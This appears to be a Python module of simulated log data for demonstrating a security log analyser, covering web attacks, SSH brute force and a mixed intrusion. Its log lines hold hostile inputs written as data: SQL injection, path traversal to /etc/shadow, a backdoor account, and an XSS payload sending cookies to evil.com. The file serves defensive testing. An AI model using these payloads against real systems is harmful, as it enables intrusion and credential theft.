"""
Sample Logs for TraceBack Sentinel
Demo-ready log data simulating common attack patterns.
"""


def get_sample_logs() -> dict:
    """
    Return a dictionary of sample log datasets.

    Returns:
        dict mapping display_name → log_content_string
    """
    return {
        '🌐 Apache Attack Medley': APACHE_ATTACK_LOG,
        '🔑 SSH Brute Force Scenario': AUTH_BRUTEFORCE_LOG,
        '⚡ Mixed Multi-Vector Attack': MIXED_THREATS_LOG,
    }


APACHE_ATTACK_LOG = """10.0.0.5 - - [25/Mar/2026:08:15:01 +0000] "GET /index.html HTTP/1.1" 200 4523
10.0.0.5 - - [25/Mar/2026:08:15:02 +0000] "GET /login.php HTTP/1.1" 200 1234
10.0.0.5 - - [25/Mar/2026:08:15:05 +0000] "GET /login.php?user=admin'%20OR%20'1'='1 HTTP/1.1" 200 1234
10.0.0.5 - - [25/Mar/2026:08:15:06 +0000] "POST /login.php HTTP/1.1" 200 892
10.0.0.5 - - [25/Mar/2026:08:15:08 +0000] "GET /admin/users.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 200 2048
10.0.0.5 - - [25/Mar/2026:08:15:10 +0000] "GET /search.php?q=<script>alert('XSS')</script> HTTP/1.1" 403 0
10.0.0.5 - - [25/Mar/2026:08:15:11 +0000] "GET /search.php?q=<img%20src=x%20onerror=alert(document.cookie)> HTTP/1.1" 403 0
172.16.0.100 - - [25/Mar/2026:08:16:00 +0000] "GET / HTTP/1.1" 200 4523
172.16.0.100 - - [25/Mar/2026:08:16:01 +0000] "GET /wp-admin/ HTTP/1.1" 404 0
172.16.0.100 - - [25/Mar/2026:08:16:02 +0000] "GET /wp-login.php HTTP/1.1" 404 0
172.16.0.100 - - [25/Mar/2026:08:16:03 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 0
172.16.0.100 - - [25/Mar/2026:08:16:04 +0000] "GET /admin/ HTTP/1.1" 404 0
172.16.0.100 - - [25/Mar/2026:08:16:05 +0000] "GET /.env HTTP/1.1" 403 0
172.16.0.100 - - [25/Mar/2026:08:16:06 +0000] "GET /.git/config HTTP/1.1" 403 0
172.16.0.100 - - [25/Mar/2026:08:16:07 +0000] "GET /xmlrpc.php HTTP/1.1" 404 0
192.168.1.200 - - [25/Mar/2026:08:20:00 +0000] "GET /../../etc/passwd HTTP/1.1" 403 0
192.168.1.200 - - [25/Mar/2026:08:20:01 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 403 0
192.168.1.200 - - [25/Mar/2026:08:20:02 +0000] "GET /cgi-bin/../../../../etc/shadow HTTP/1.1" 403 0
10.0.0.5 - - [25/Mar/2026:08:22:00 +0000] "GET /api/users?id=1;DROP%20TABLE%20users HTTP/1.1" 500 0
10.0.0.5 - - [25/Mar/2026:08:22:01 +0000] "POST /api/login HTTP/1.1" 401 52
10.0.0.5 - - [25/Mar/2026:08:22:02 +0000] "POST /api/login HTTP/1.1" 401 52
10.0.0.5 - - [25/Mar/2026:08:22:03 +0000] "POST /api/login HTTP/1.1" 401 52
10.0.0.5 - - [25/Mar/2026:08:22:04 +0000] "POST /api/login HTTP/1.1" 200 1024
8.8.8.8 - - [25/Mar/2026:08:30:00 +0000] "GET / HTTP/1.1" 200 4523
8.8.8.8 - - [25/Mar/2026:08:30:01 +0000] "GET /about HTTP/1.1" 200 3200"""

AUTH_BRUTEFORCE_LOG = """Mar 25 03:00:01 webserver sshd[4521]: Failed password for root from 192.168.1.105 port 52341 ssh2
Mar 25 03:00:02 webserver sshd[4521]: Failed password for root from 192.168.1.105 port 52341 ssh2
Mar 25 03:00:03 webserver sshd[4521]: Failed password for root from 192.168.1.105 port 52341 ssh2
Mar 25 03:00:04 webserver sshd[4521]: Failed password for root from 192.168.1.105 port 52341 ssh2
Mar 25 03:00:05 webserver sshd[4521]: Failed password for root from 192.168.1.105 port 52341 ssh2
Mar 25 03:00:06 webserver sshd[4521]: Failed password for root from 192.168.1.105 port 52341 ssh2
Mar 25 03:00:07 webserver sshd[4521]: Failed password for root from 192.168.1.105 port 52341 ssh2
Mar 25 03:00:08 webserver sshd[4521]: Failed password for root from 192.168.1.105 port 52341 ssh2
Mar 25 03:00:09 webserver sshd[4521]: Failed password for root from 192.168.1.105 port 52341 ssh2
Mar 25 03:00:10 webserver sshd[4521]: Failed password for root from 192.168.1.105 port 52341 ssh2
Mar 25 03:00:15 webserver sshd[4521]: Failed password for invalid user admin from 192.168.1.105 port 52342 ssh2
Mar 25 03:00:16 webserver sshd[4521]: Failed password for invalid user test from 192.168.1.105 port 52343 ssh2
Mar 25 03:00:17 webserver sshd[4521]: Failed password for invalid user ubuntu from 192.168.1.105 port 52344 ssh2
Mar 25 03:00:18 webserver sshd[4521]: Failed password for invalid user deploy from 192.168.1.105 port 52345 ssh2
Mar 25 03:00:19 webserver sshd[4521]: Failed password for invalid user postgres from 192.168.1.105 port 52346 ssh2
Mar 25 03:00:20 webserver sshd[4521]: Failed password for invalid user mysql from 192.168.1.105 port 52347 ssh2
Mar 25 03:01:00 webserver sshd[4521]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 rname= rhost=192.168.1.105
Mar 25 03:01:30 webserver sshd[4521]: Accepted password for root from 192.168.1.105 port 52400 ssh2
Mar 25 03:01:31 webserver sshd[4521]: pam_unix(sshd:session): session opened for user root by (uid=0)
Mar 25 03:05:00 webserver sudo[4600]: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /etc/shadow
Mar 25 03:05:30 webserver sudo[4601]: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/useradd backdoor
Mar 25 03:06:00 webserver sshd[4700]: Accepted password for backdoor from 192.168.1.105 port 52500 ssh2
Mar 25 08:00:00 webserver sshd[5000]: Accepted publickey for admin from 10.0.0.1 port 22 ssh2
Mar 25 08:00:01 webserver sshd[5000]: pam_unix(sshd:session): session opened for user admin by (uid=1000)"""

MIXED_THREATS_LOG = """Mar 25 02:00:01 appserver sshd[1001]: Failed password for root from 203.0.113.50 port 44100 ssh2
Mar 25 02:00:02 appserver sshd[1001]: Failed password for root from 203.0.113.50 port 44100 ssh2
Mar 25 02:00:03 appserver sshd[1001]: Failed password for root from 203.0.113.50 port 44100 ssh2
Mar 25 02:00:04 appserver sshd[1001]: Failed password for root from 203.0.113.50 port 44100 ssh2
Mar 25 02:00:05 appserver sshd[1001]: Failed password for root from 203.0.113.50 port 44100 ssh2
Mar 25 02:00:06 appserver sshd[1001]: Failed password for invalid user oracle from 203.0.113.50 port 44101 ssh2
203.0.113.50 - - [25/Mar/2026:02:05:00 +0000] "GET / HTTP/1.1" 200 5120
203.0.113.50 - - [25/Mar/2026:02:05:01 +0000] "GET /wp-login.php HTTP/1.1" 404 0
203.0.113.50 - - [25/Mar/2026:02:05:02 +0000] "GET /admin/ HTTP/1.1" 404 0
203.0.113.50 - - [25/Mar/2026:02:05:03 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 0
203.0.113.50 - - [25/Mar/2026:02:05:04 +0000] "GET /.env HTTP/1.1" 403 0
203.0.113.50 - - [25/Mar/2026:02:05:05 +0000] "GET /.git/HEAD HTTP/1.1" 403 0
198.51.100.25 - - [25/Mar/2026:04:00:00 +0000] "GET /login?user=admin'%20OR%201=1-- HTTP/1.1" 200 890
198.51.100.25 - - [25/Mar/2026:04:00:01 +0000] "GET /products?id=1%20UNION%20SELECT%20*%20FROM%20information_schema.tables HTTP/1.1" 500 0
198.51.100.25 - - [25/Mar/2026:04:00:02 +0000] "POST /api/search HTTP/1.1" 200 2048
198.51.100.25 - - [25/Mar/2026:04:00:03 +0000] "GET /profile?name=<script>document.location='http://evil.com/?c='+document.cookie</script> HTTP/1.1" 403 0
198.51.100.25 - - [25/Mar/2026:04:00:04 +0000] "GET /files/../../../etc/passwd HTTP/1.1" 403 0
198.51.100.25 - - [25/Mar/2026:04:00:05 +0000] "GET /files/..%2f..%2f..%2fetc%2fshadow HTTP/1.1" 403 0
Mar 25 06:00:00 appserver sshd[2000]: Accepted password for deploy from 10.0.0.5 port 22 ssh2
Mar 25 06:00:01 appserver sshd[2000]: pam_unix(sshd:session): session opened for user deploy by (uid=1001)
10.0.0.5 - - [25/Mar/2026:06:01:00 +0000] "GET / HTTP/1.1" 200 5120
10.0.0.5 - - [25/Mar/2026:06:01:01 +0000] "GET /api/status HTTP/1.1" 200 128
10.0.0.5 - - [25/Mar/2026:06:01:02 +0000] "POST /api/deploy HTTP/1.1" 200 64"""
